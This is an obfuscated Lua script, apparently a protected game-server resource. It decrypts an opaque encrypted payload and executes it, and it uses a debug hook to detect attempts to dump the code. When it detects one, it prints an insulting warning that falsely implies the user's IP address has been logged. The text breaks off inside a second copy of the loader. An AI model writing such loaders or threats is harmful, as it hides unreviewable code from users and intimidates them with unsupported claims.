      [hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('35') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('FE') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6C') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('5B') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('48') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('C9')]
      [hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('A5') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('92') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('13') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6C')](
      q) end
    ; n(fSuJ3Z17Z6UMQwrp24wJHGvMEwZj39lmwllju1Op6QjgTCmMJ2c7g)
  end; sXGJZ84VZWwDxtbP5wNBTwVQa5znBqji1e2MRUOsxiFSzK3zVTy9(f,
    function(r) mhl35nXlF4Ir1ep8z6qcbgdUwqJOMvzaiXxLKWzA7o4hlnTgFuDb(r, g,
        function(s) oWPezG7rXfccXCGztl3NQVZjmZIGammECSMQOeMrdGhgPAMe9Fh3pQAC1TkVrgt0YyuuHl9cYX(s,
            function(t) if #xi8iCLkPV3IclFUD63OVyax244R3ziaQuP8usOD4GG9AH88GPMOx3zhEjFMNy6k(tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju[hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('B6') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('11') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('13') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6E')]) == 1 then if tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju[hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('B6') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('11') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('13') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6E')] == tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju[hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('DA') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6C') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('5B') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('48') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('FE')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju[hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('B6') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('11') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('13') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6E')](t) then
                    tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju
                        [hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('B6') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('11') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('13') .. hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn('6E')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; ghAf1ig7wy4uK3FBZKN6dYt5v4IHa4SXzTS1FHSo3eF8oHM1uWT4dqIAkfnBDdxWGgtW(
{ 866, 719, 1105, 1091, 1192, 873, 916, 1136, 949, 627, 1018, 613, 1012, 572, 1110, 621, 965, 1129, 1067, 1047, 930, 564,
  880, 553, 896, 622, 673, 785, 614, 753, 727, 1063, 804, 650, 985, 1117, 1174, 691, 859, 1125, 966, 682, 1200, 818,
  1139, 1167, 803, 865, 699, 1209, 1088, 990, 1033, 547, 739, 582, 848, 680, 832, 1082, 1173, 1145, 706, 1051, 597, 1101,
  1140, 889, 697, 994, 1119, 678, 736, 908, 554, 870, 1032, 750, 1190, 1069, 872, 1003, 765, 1104, 981, 807, 549, 831,
  1135, 1048, 781, 979, 1195, 1164, 762, 674, 1058, 623, 755, 863, 879, 634, 730, 1194, 975, 611, 900, 1168, 769, 596,
  1059, 894, 763, 1157, 936, 862, 867, 645, 1025, 775, 580, 1070, 1151, 615, 1083, 955, 1079, 1148, 767, 644, 1035, 799,
  1109, 869, 796, 1049, 1197, 792, 922, 721, 1210, 1112, 921, 993, 1176, 752, 723, 1072, 720, 722, 1169, 1050, 1066, 666,
  1054, 1178, 679, 1196, 608, 741, 1108, 702, 747, 757, 576, 1156, 931, 1078, 1071, 600, 819, 563, 1132, 1121, 1041, 761,
  1061, 638, 934, 1179, 899, 840, 688, 884, 874, 784, 897, 604, 636, 810, 1075, 647, 603, 643, 839, 683, 1093, 1199, 802,
  1120, 710, 948, 1142, 725, 661, 546, 776, 696, 742, 558, 971, 1149, 601, 1005, 1203, 1159, 738, 607, 875, 1184, 983,
  1081, 964, 1004, 686, 945, 1189, 1040, 681, 703, 942, 1123, 737, 557, 687, 684, 1202, 1127, 830, 1177, 996, 556, 548,
  685, 786, 698, 811, 1010, 928, 1006, 1165, 947, 1011, 648, 825, 823, 891, 1055, 882, 984, 1016, 795, 1166, 637, 927,
  562, 1056, 593, 977, 1052, 1039, 940, 864, 749, 1147, 1113, 1015, 700, 1100, 1027, 939, 1128, 610, 774, 838, 1098, 569,
  815, 903, 1014, 559, 764, 571, 585, 594, 693, 851, 1182, 835, 574, 1138, 646, 1183, 1161, 1111, 772, 1133, 902, 616,
  1175, 568, 943, 1026, 716, 632, 953, 988, 797, 801, 733, 545, 655, 957, 659, 1092, 854, 814, 1095, 976, 1053, 581, 937,
  779, 850, 718, 1038, 1044, 635, 982, 756, 633, 626, 1158, 1134, 1115, 746, 974, 1118, 919, 570, 846, 1096, 1208, 822,
  726, 668, 1023, 729, 676, 820, 998, 881, 754, 768, 938, 713, 868, 1212, 967, 907, 836, 620, 1163, 663, 766, 827, 925,
  1206, 794, 606, 1137, 709, 642, 1086, 824, 991, 1045, 961, 1073, 731, 833, 1000, 1126, 1076, 788, 946, 777, 888, 1170,
  1009, 609, 1180, 708, 915, 973, 1186, 543, 555, 1144, 618, 813, 969, 1188, 1211, 895, 695, 771, 1074, 798, 617, 904,
  805, 1191, 989, 573, 871, 911, 735, 920, 1172, 1062, 923, 1020, 560, 1064, 842, 1028, 584, 1043, 619, 662, 855, 878,
  853, 660, 759, 595, 941, 1077, 689, 578, 893, 887, 898, 890, 1036, 1085, 641, 612, 1068, 602, 1013, 806, 624, 577, 817,
  740, 1024, 773, 970, 758, 567, 821, 586, 951, 861, 1185, 849, 782, 629, 599, 544, 561, 671, 672, 651, 1204, 588, 906,
  1057, 1008, 1141, 751, 1107, 826, 1099, 1122, 1019, 760, 550, 705, 664, 694, 667, 1143, 657, 692, 631, 649, 1089, 670,
  658, 1084, 791, 1193, 590, 995, 787, 1007, 704, 1097, 1060, 1042, 1201, 652, 575, 639, 932, 589, 912, 1207, 625, 844,
  734, 944, 909, 935, 800, 999, 905, 1160, 914, -1, 35, 65, 88, 93, 33, 67, 85, 89, 108, 30, 20, 78, 59, 45, 10, 115, 46,
  61, 104, 48, 119, 31, 179, 61, 83, 4, 29, 61, 101, 4, 16, 65, 55, 28, 11, 87, 113, 119, 73, 58, 136, 26, 104, 115, 122,
  73, 23, 29, 150, 255, 37, 30, 62, 53, 25, 97, 77, 77, 121, 29, 91, 116, 8, 102, 99, 17, 15, 12, 51, 50, 71, 88, 100,
  65, 121, 107, 30, 66, 51, 54, 100, 67, 99, 60, 62, 92, 23, 199, 65, 66, 66, 90, 43, 116, 62, 74, 107, 247, 42, 73, 16,
  72, 8, 51, 109, 42, 36, 100, 54, 36, 88, 46, 47, 149, 23, 60, 83, 22, 69, 19, 106, 104, 52, 93, 106, 120, 15, 54, 102,
  50, 28, 116, 132, 19, 67, 39, 71, 50, 65, 102, 82, 32, 98, 119, 1, 82, 38, 44, 30, 77, 100, 16, 38, 113, 119, 95, 6,
  52, 137, 102, 31, 98, 103, 16, 165, 87, 120, 88, 92, 209, 49, 30, 4, 116, 14, 73, 4, 65, 106, 56, 37, 216, 94, 119, 63,
  95, 99, 24, 39, 141, 104, 77, 23, 86, 27, 77, 22, 2, 117, 77, 239, 151, 24, 60, 113, 129, 19, 101, 86, 47, 113, 21, 67,
  116, 111, 31, 42, 46, 111, 112, 85, 110, 36, 87, 18, 45, 106, 26, 26, 42, 93, 14, 50, 68, 41, 57, 19, 207, 1, 87, 159,
  126, 59, 85, 83, 106, 239, 33, 32, 104, 215, 104, 61, 106, 39, 22, 50, 113, 107, 123, 20, 43, 115, 65, 58, 120, 157,
  112, 25, 207, 17, 59, 36, 109, 3, 59, 111, 89, 106, 102, 28, 85, 95, 85, 23, 249, 31, 47, 57, 36, 1, 202, 65, 96, 90,
  88, 95, 110, 82, 126, 0, 74, 28, 77, 120, 56, 106, 89, 87, 136, 122, 19, 98, 250, 228, 249, 103, 253, 104, 84, 21, 24,
  21, 127, 31, 22, 43, 86, 106, 76, 60, 15, 87, 83, 17, 91, 19, 28, 90, 21, 194, 102, 71, 227, 20, 104, 53, 12, 26, 226,
  100, 45, 86, 21, 102, 95, 81, 95, 61, 23, 9, 106, 38, 19, 116, 70, 97, 254, 87, 13, 238, 29, 6, 53, 204, 193, 25, 77,
  77, 70, 41, 104, 77, 190, 100, 56, 139, 19, 68, 104, 25, 81, 112, 4, 99, 17, 28, 84, 33, 6, 48, 104, 120, 58, 119, 123,
  120, 8, 103, 139, 60, 105, 115, 211, 22, 86, 125, 4, 90, 150, 141, 104, 50, 104, 106, 50, 87, 125, 26, 205, 37, 88, 85,
  93, 31, 244, 65, 29, 103, 19, 2, 55, 16, 62, 200, 50, 104, 59, 22, 23, 17, 59, 12, 50, 12, 73, 99, 32, 91, 250, 121,
  102, 98, 124, 124, 73, 47, 21, 15, 63, 38, 48, 62, 7, 58, 3, 55, 51, 25, 137, 73, 39, 56, 89, 48, 19, 186, 2, 173, 86,
  85, 73, 127, 19, 209, 90, 18, 38, 78, 22, 6, 86, 27, 114, 126, 91, 56, 72, 23, 57, 120, 90, 31, 40, 89, 73, 53, 116,
  20, 43, 33, 73, 127, 93, 73, 44, 56, 101, 74, 43, 26, 94, 5, 43, 46, 3, 12, 63, 107, 35, 26, 65, 96, 99, 6, 86, 41,
  175, 43, 8, 112, 156, 111, 65, 85, 50, 116, 12, 9, 160, 80, 60, 83, 244, 98, 109, 89, 57, 29, 89, 32, 119, 103, 87, 41,
  47, 6, 127, 106, 83, 8, 208, 65, 83, 11, 30, 43, 192, 107, 110, 92, 39, 18, 37, 119, 46, 11, 33, 90, 1, 87, 1, 36, 17,
  45, 20, 126, 194, 65, 167, 176, 54, 123, 109, 106, 50, 111, 93, 59, 97, 16, 110, 120, 88, 107, 63, 20, 68, 56, 65, 89,
  21, 31, 41, 34, 101, 75, 67, 228, 65, 57, 83, 16, 39, 252, 75, 57, 5, 103, 44, 92, 45, 117, 97, 107, 89, 97, 119, 60,
  70, 117, 13, 242, 65, 50, 104, 22, 30, 83, 100 }, "uT6YJSGH0Jw7maHFWXiC3yizvB"); nnLULnOxHFlzFUrCfGwiUN2glWEXqdGox0E6Jk3hsohPOUyBZ7msrmAw4fCe9heLZXnqDixDC =
tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju; d9VqtNQdiUB3q1GP800vnFCWV5HZUwUk1ryo3Y7y9F3jflOoSxihnK0Wuk2fFlgGj0Ce =
tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju; qdWYeQh0obza1RYcSCIxDTHW21nBhSwhA6eQItIkUj1KYLCrQZ49lpV0GP2PdL92zW =
d9VqtNQdiUB3q1GP800vnFCWV5HZUwUk1ryo3Y7y9F3jflOoSxihnK0Wuk2fFlgGj0Ce; qCRneHvVXAcp3k1sxpCNvDpY0rtC1yImsKoQAaXHjsIsaoGyyj3sc21rfqEeN =
qdWYeQh0obza1RYcSCIxDTHW21nBhSwhA6eQItIkUj1KYLCrQZ49lpV0GP2PdL92zW; yq0NCnzvb91Ao8tOpXIN2XLTzSPU0b60j4XNgUzdHgO180hPlwadkYRJyzpu0fGo4qufm =
qCRneHvVXAcp3k1sxpCNvDpY0rtC1yImsKoQAaXHjsIsaoGyyj3sc21rfqEeN; hu3S370WrYfJEkuNwgOdJuyZzGwfRjRh7VcEKXC6B05eqmY6keR5uWb =
yq0NCnzvb91Ao8tOpXIN2XLTzSPU0b60j4XNgUzdHgO180hPlwadkYRJyzpu0fGo4qufm; keqRfNnOfWKz6qopd5YgtUlWLA2AH4XscqsT3O5ANRGwnPwx7AmBZPjCUzO6Lv95m8LLgHdG =
hu3S370WrYfJEkuNwgOdJuyZzGwfRjRh7VcEKXC6B05eqmY6keR5uWb; hXQTNAdt9SVJDy6DVCkse1LwEUlnbwaiH6yRY5o0QqbxP1VOuccwUqCl8Xf7GKeqZtoa8A =
keqRfNnOfWKz6qopd5YgtUlWLA2AH4XscqsT3O5ANRGwnPwx7AmBZPjCUzO6Lv95m8LLgHdG; vRUA5tzMeXvMGOR4NcocpMP54nNaMdUhAVupAI9ATvSaO7i06ftG06meiQfYsWpnJUrSDh =
hXQTNAdt9SVJDy6DVCkse1LwEUlnbwaiH6yRY5o0QqbxP1VOuccwUqCl8Xf7GKeqZtoa8A; cWMvjcTFCj3ohhqs8fCVZwaQmWKwwb5vBmOJT1qY8F7DQsFrzmD9vH1LIAS4q5gyl6yCqYSQSnC =
vRUA5tzMeXvMGOR4NcocpMP54nNaMdUhAVupAI9ATvSaO7i06ftG06meiQfYsWpnJUrSDh; gT8pdfjbJkRV3Gon8GGY2VrnMY2naLOb4zMo8kvqO4iadX0VnUhsXPgqCZ0EI4EyYZvxa =
cWMvjcTFCj3ohhqs8fCVZwaQmWKwwb5vBmOJT1qY8F7DQsFrzmD9vH1LIAS4q5gyl6yCqYSQSnC; sdjRgR63JqqEKNeCat141fdByYLRwCsLNBWaTOgIpTGpk1cBpK4PH6 =
gT8pdfjbJkRV3Gon8GGY2VrnMY2naLOb4zMo8kvqO4iadX0VnUhsXPgqCZ0EI4EyYZvxa; os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh =
sdjRgR63JqqEKNeCat141fdByYLRwCsLNBWaTOgIpTGpk1cBpK4PH6; rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW = function(
  a)
  K, F = 3396281056566371, 16384 + 3173; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; yqLuq06sDLoDrvjK0luF1IdASeHbcFHj0EO8GCTWArLZjFmSzUEr2hJ0fXxUQ = function(b)
  co = coroutine.create(b)
  iNHCJdi6ILEJfZq0R2rS2J13OFsbx8cFNB15JT2zCeny87arXI4 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(iNHCJdi6ILEJfZq0R2rS2J13OFsbx8cFNB15JT2zCeny87arXI4, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return iNHCJdi6ILEJfZq0R2rS2J13OFsbx8cFNB15JT2zCeny87arXI4
end; xyZOyXQzri7dhgKAqhjfYNkmPiObbQ6uAkVnvonn4rJj0HVVbff2mqrIriaCy3Q7W3jdccQ = function(f, g)
  hGG8n2mWJ079xK6v4RwCoTAdR4X6PqSPauZbSm4qBBI9nOHEEGwXmK3Ye7F7cv70YKjnPh2Tr5R = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; iTsiBl9uSB1YFec1LnYcqP9iTaOElVrK6whmHgdwaDu08THukU7GCysgiWk22 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; yhctn6E1gYLhGrKGIceJASjiS0vnqY4hhBrPLZsm9XpMS7ewb3dYad = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      hGG8n2mWJ079xK6v4RwCoTAdR4X6PqSPauZbSm4qBBI9nOHEEGwXmK3Ye7F7cv70YKjnPh2Tr5R(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; coo9e0404tlq7tUMNw8mI3Hor2r7sSMGYlFS4RFAXtOp04JsL9Gb9vE = function(p, n)
    gkh65gm0Ao92l7DqwWucFf74AkKfxTPhMUL7XJt1snXQwcaTJne6OSLjWWZJpETRpj3f = ""
    for k, q in pairs(p) do gkh65gm0Ao92l7DqwWucFf74AkKfxTPhMUL7XJt1snXQwcaTJne6OSLjWWZJpETRpj3f =
      gkh65gm0Ao92l7DqwWucFf74AkKfxTPhMUL7XJt1snXQwcaTJne6OSLjWWZJpETRpj3f ..
      os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh
      [rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('55') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('8C') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1E') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('2F') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('42') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('C1')]
      [rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('E5') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('F8') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('77') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1E')](
      q) end
    ; n(gkh65gm0Ao92l7DqwWucFf74AkKfxTPhMUL7XJt1snXQwcaTJne6OSLjWWZJpETRpj3f)
  end; iTsiBl9uSB1YFec1LnYcqP9iTaOElVrK6whmHgdwaDu08THukU7GCysgiWk22(f,
    function(r) yhctn6E1gYLhGrKGIceJASjiS0vnqY4hhBrPLZsm9XpMS7ewb3dYad(r, g,
        function(s) coo9e0404tlq7tUMNw8mI3Hor2r7sSMGYlFS4RFAXtOp04JsL9Gb9vE(s,
            function(t) if #yqLuq06sDLoDrvjK0luF1IdASeHbcFHj0EO8GCTWArLZjFmSzUEr2hJ0fXxUQ(os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh[rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('D4') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('79') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('77') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1C')]) == 1 then if os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh[rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('D4') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('79') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('77') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1C')] == os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh[rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('B0') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1E') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('2F') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('42') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('8C')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh[rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('D4') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('79') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('77') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1C')](t) then
                    os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh
                        [rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('D4') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('79') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('77') .. rvBc20290gjqvPRYdhWwSerATeIC55stqS2nsWqK42mbOtISJTHdJAVmxukeCHYKaW('1C')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32